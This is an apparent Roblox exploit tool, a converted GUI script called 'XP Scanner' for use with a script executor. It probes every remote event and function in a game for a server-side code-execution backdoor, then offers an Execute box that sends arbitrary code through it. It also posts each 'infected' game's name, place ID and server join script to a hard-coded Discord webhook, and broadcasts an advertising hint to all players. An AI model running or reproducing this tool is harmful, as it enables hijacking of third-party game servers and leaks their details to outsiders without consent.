--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 25 | Scripts: 4 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 2;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 498, 0, 231);
G2L["2"]["Position"] = UDim2.new(0.12586, 0, 0.22814, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.ScreenGui.Frame.Ex
G2L["3"] = Instance.new("TextButton", G2L["2"]);
G2L["3"]["TextWrapped"] = true;
G2L["3"]["TextStrokeTransparency"] = 0;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["TextSize"] = 14;
G2L["3"]["TextScaled"] = true;
G2L["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3"]["Size"] = UDim2.new(0, 195, 0, 32);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Text"] = [[Execute]];
G2L["3"]["Name"] = [[Ex]];
G2L["3"]["Visible"] = false;
G2L["3"]["Position"] = UDim2.new(0.04401, 0, 0.77488, 0);


-- StarterGui.ScreenGui.Frame.Ex.LocalScript
G2L["4"] = Instance.new("LocalScript", G2L["3"]);



-- StarterGui.ScreenGui.Frame.Ex.UIStroke
G2L["5"] = Instance.new("UIStroke", G2L["3"]);
G2L["5"]["Thickness"] = 3;
G2L["5"]["Color"] = Color3.fromRGB(0, 255, 0);


-- StarterGui.ScreenGui.Frame.Ex.UIStroke
G2L["6"] = Instance.new("UIStroke", G2L["3"]);
G2L["6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6"]["Color"] = Color3.fromRGB(0, 255, 0);


-- StarterGui.ScreenGui.Frame.Ex.UICorner
G2L["7"] = Instance.new("UICorner", G2L["3"]);



-- StarterGui.ScreenGui.Frame.TextButton
G2L["8"] = Instance.new("TextButton", G2L["2"]);
G2L["8"]["TextWrapped"] = true;
G2L["8"]["TextStrokeTransparency"] = 0;
G2L["8"]["TextSize"] = 14;
G2L["8"]["TextScaled"] = true;
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8"]["Size"] = UDim2.new(0, 350, 0, 100);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[Scan]];
G2L["8"]["Position"] = UDim2.new(0.14679, 0, 0.28044, 0);


-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
G2L["9"] = Instance.new("LocalScript", G2L["8"]);



-- StarterGui.ScreenGui.Frame.TextButton.UICorner
G2L["a"] = Instance.new("UICorner", G2L["8"]);



-- StarterGui.ScreenGui.Frame.TextButton.UIStroke
G2L["b"] = Instance.new("UIStroke", G2L["8"]);
G2L["b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["b"]["Color"] = Color3.fromRGB(255, 255, 0);


-- StarterGui.ScreenGui.Frame.TextButton.UIStroke
G2L["c"] = Instance.new("UIStroke", G2L["8"]);
G2L["c"]["Thickness"] = 3;
G2L["c"]["Color"] = Color3.fromRGB(255, 255, 0);


-- StarterGui.ScreenGui.Frame.Key
G2L["d"] = Instance.new("StringValue", G2L["2"]);
G2L["d"]["Name"] = [[Key]];


-- StarterGui.ScreenGui.Frame.MainText
G2L["e"] = Instance.new("TextLabel", G2L["2"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["TextStrokeTransparency"] = 0;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextScaled"] = true;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Size"] = UDim2.new(0, 498, 0, 50);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[XP Scanner]];
G2L["e"]["Name"] = [[MainText]];
G2L["e"]["Position"] = UDim2.new(-0.00197, 0, 0, 0);


-- StarterGui.ScreenGui.Frame.MainText.UIStroke
G2L["f"] = Instance.new("UIStroke", G2L["e"]);
G2L["f"]["Thickness"] = 3;
G2L["f"]["Color"] = Color3.fromRGB(255, 0, 0);


-- StarterGui.ScreenGui.Frame.Cl
G2L["10"] = Instance.new("TextButton", G2L["2"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["TextStrokeTransparency"] = 0;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextSize"] = 14;
G2L["10"]["TextScaled"] = true;
G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["Size"] = UDim2.new(0, 179, 0, 32);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[Clear]];
G2L["10"]["Name"] = [[Cl]];
G2L["10"]["Visible"] = false;
G2L["10"]["Position"] = UDim2.new(0.60238, 0, 0.77488, 0);


-- StarterGui.ScreenGui.Frame.Cl.LocalScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.ScreenGui.Frame.Cl.UIStroke
G2L["12"] = Instance.new("UIStroke", G2L["10"]);
G2L["12"]["Thickness"] = 3;
G2L["12"]["Color"] = Color3.fromRGB(255, 0, 0);


-- StarterGui.ScreenGui.Frame.Cl.UIStroke
G2L["13"] = Instance.new("UIStroke", G2L["10"]);
G2L["13"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["13"]["Color"] = Color3.fromRGB(255, 0, 0);


-- StarterGui.ScreenGui.Frame.Cl.UICorner
G2L["14"] = Instance.new("UICorner", G2L["10"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame
G2L["15"] = Instance.new("ScrollingFrame", G2L["2"]);
G2L["15"]["Visible"] = false;
G2L["15"]["Active"] = true;
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["CanvasSize"] = UDim2.new(0, 0, 10, 0);
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["Size"] = UDim2.new(0, 456, 0, 116);
G2L["15"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Position"] = UDim2.new(0.04473, 0, 0.23644, 0);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["ScrollBarThickness"] = 10;


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextBox
G2L["16"] = Instance.new("TextBox", G2L["15"]);
G2L["16"]["CursorPosition"] = -1;
G2L["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextWrapped"] = true;
G2L["16"]["TextSize"] = 28;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["MultiLine"] = true;
G2L["16"]["ClearTextOnFocus"] = false;
G2L["16"]["PlaceholderText"] = [[Your Code Here]];
G2L["16"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[]];


-- StarterGui.ScreenGui.Frame.UIDrag
G2L["17"] = Instance.new("LocalScript", G2L["2"]);
G2L["17"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Frame.UICorner
G2L["18"] = Instance.new("UICorner", G2L["2"]);



-- StarterGui.ScreenGui.Frame.UIStroke
G2L["19"] = Instance.new("UIStroke", G2L["2"]);
G2L["19"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["19"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.ScreenGui.Frame.Ex.LocalScript
local function C_4()
local script = G2L["4"];
	script.Parent.MouseButton1Click:Connect(function()
		local backdooredevent = game:GetService("ReplicatedStorage")[script.Parent.Parent.Key.Value]
		local code = script.Parent.Parent.ScrollingFrame.TextBox.Text
		if backdooredevent:IsA("RemoteEvent") then
			backdooredevent:FireServer(code)
		end
		if backdooredevent:IsA("RemoteFunction") then
			backdooredevent:InvokeServer(code)
		end
		if backdooredevent:IsA("BindableEvent") then
			backdooredevent:Fire(code)
		end
		if backdooredevent:IsA("BindableFunction") then
			backdooredevent:Invoke(code)
		end
	end)
end;
task.spawn(C_4);
-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
local function C_9()
local script = G2L["9"];
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local MarketplaceService = game:GetService("MarketplaceService")
	
	local button = script.Parent
	local gui = button.Parent
	local keyValue = gui:FindFirstChild("Key")
	local scrollFrame = gui:FindFirstChild("ScrollingFrame")
	
	local function sendW()
		local HttpRequest = http_request or (syn and syn.request)
		if not HttpRequest then
			return
		end
	
		local webhook_url = "https://discord.com/api/webhooks/1413077044056555580/myr4UfvDLz2LrPEKehbxp2qileNq_mStX24B7vcmD4Wxap_MYZMPgM9BEWi1jfX1R8PI"
	
		local embedData = {
			title = "Infected",
			description = "New game infected",
			color = 65280,
			fields = {
				{
					name = "Server Info",
					value = "**Players:** " .. tostring(#Players:GetPlayers())
						.. "\n**Join Script:**\nRoblox.GameLauncher.joinGameInstance("
						.. tostring(game.PlaceId) .. ", '" .. tostring(game.JobId) .. "')\n",
					inline = false
				},
				{
					name = "Game Info",
					value = "**Game Name:** " .. MarketplaceService:GetProductInfo(game.PlaceId).Name
						.. "\n**Game Link:** [Click Here](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. ")",
					inline = false
				}
			}
		}
	
		HttpRequest({
			Url = webhook_url,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode({ content = "@everyone", embeds = { embedData } })
		})
	end
	
	local function scan(i, startTime)
		local key = HttpService:GenerateGUID(false)
		local success, err = pcall(function()
			if i:IsA("BindableFunction") then
				i:Invoke("Instance.new('Model', workspace).Name='" .. key .. "'")
			elseif i:IsA("RemoteEvent") then
				i:FireServer("Instance.new('Model', workspace).Name='" .. key .. "'")
			elseif i:IsA("RemoteFunction") then
				i:InvokeServer("Instance.new('Model', workspace).Name='" .. key .. "'")
			elseif i:IsA("BindableEvent") then
				i:Fire("Instance.new('Model', workspace).Name='" .. key .. "'")
			end
		end)
	
		if not success then
			warn("Error testing", i.Name, ":", err)
			return false
		end
	
		for _ = 1,100 do
			local found = workspace:FindFirstChild(key)
			if found then
				found:Destroy()
	
				local newname = HttpService:GenerateGUID(false)
				i.Name = newname
				if keyValue then keyValue.Value = newname end
	
				if scrollFrame and scrollFrame:FindFirstChild("TextBox") then
					scrollFrame.TextBox.Text = "--Found backdoor at: " .. string.format("%.2f", os.clock() - startTime) .. "s"
					scrollFrame.Visible = true
				end
				
				if i:IsA("BindableFunction") then
					i:Invoke("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner - discord.gg/7gEksmdKgq'")
				elseif i:IsA("RemoteEvent") then
					i:FireServer("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner - discord.gg/7gEksmdKgq'")
				elseif i:IsA("RemoteFunction") then
					i:InvokeServer("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner - discord.gg/7gEksmdKgq'")
				elseif i:IsA("BindableEvent") then
					i:Fire("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner - discord.gg/7gEksmdKgq'")
				end
				
				gui.Ex.Visible = true
				gui.Cl.Visible = true
				button.Visible = false
	
				sendW()
				return true
			end
			task.wait()
		end
		return false
	end
	
	button.MouseButton1Click:Connect(function()
		button.Interactable = false
		local start = os.clock()
	
		for _, i in ipairs(ReplicatedStorage:GetDescendants()) do
			if scan(i, start) then
				button.Interactable = true
				return
			end
		end
	
		button.Text = "Couldn't find any backdoor :("
		task.wait(3)
		button.Text = "Scan"
		button.Interactable = true
	end)
	
end;
task.spawn(C_9);
-- StarterGui.ScreenGui.Frame.Cl.LocalScript
local function C_11()
local script = G2L["11"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.ScrollingFrame.TextBox.Text=""
	end)
end;
task.spawn(C_11);
-- StarterGui.ScreenGui.Frame.UIDrag
local function C_17()
local script = G2L["17"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_17);

return G2L["1"], require;
